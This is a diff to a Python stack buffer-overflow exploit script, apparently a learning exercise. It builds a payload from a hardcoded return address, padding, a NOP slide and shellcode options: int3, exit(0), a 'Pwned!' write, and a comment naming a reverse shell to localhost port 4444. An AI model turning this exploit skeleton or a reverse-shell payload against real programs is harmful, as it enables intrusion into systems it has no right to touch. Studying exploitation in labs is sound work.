@@ -2,15 +2,35 @@ import struct
 
 #TARGET_RIP = 0x7fffffffcb88  #0x7fffffffd3d0
 TARGET_RIP = 0x7fffffffdc40 # RIP + 8 bytes (it changes everytime you run the exploit due to ASLR)
-NEW_RIP_BYTES = struct.pack('<Q', TARGET_RIP)  # <Q Make it Little Endian 
+NEW_RIP_BYTES = struct.pack('<Q', TARGET_RIP)  # <Q Make it Little Endian
 
 PADDING = b'G' * 2136
 
 NOP_SLIDE = b'\x90' * 200
 
+# int3 (for debugging)
 SHELLCODE = b'\xcc\xcc\xcc\xcc'
-#SHELLCODE = b'\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05'
-#SHELLCODE = b'\xeb\x1d\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x48\xff\xc7\x48\x31\xd2\xb2\x02\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xe1\xff\xff\xff\x4f\x4b'
+
+# exit(0)
+"""
+https://electronicsreference.com/assembly-language/linux_syscalls/exit/
+https://defuse.ca/online-x86-assembler.htm#disassembly
+mov rax, 0x3c #exit
+mov rdi, 0x0 #0
+syscall
+"""
+SHELLCODE = b'\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05'
+
+# Write Pwned!
+"""
+mov rax, 0x1 #write
+mov rdi, 0x1 #set stdout for write
+lea rsi, [rip + 0xf] #set source with relative address
+mov rdx, 0x7 #set data length=7 (Pwned!)
+systemcall
+
+https://defuse.ca/online-x86-assembler.htm#disassembly
+"""
 #SHELLCODE = b'\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x8d\x35\x0f\x00\x00\x00\x48\xc7\xc2\x07\x00\x00\x00\x0f\x05\x50\x77\x6e\x65\x64\x21'
 
 # Rev Shell (https://privdayz.com/tools/shellcode-gen) Linux x86 RevShell 127.0.0.1 4444
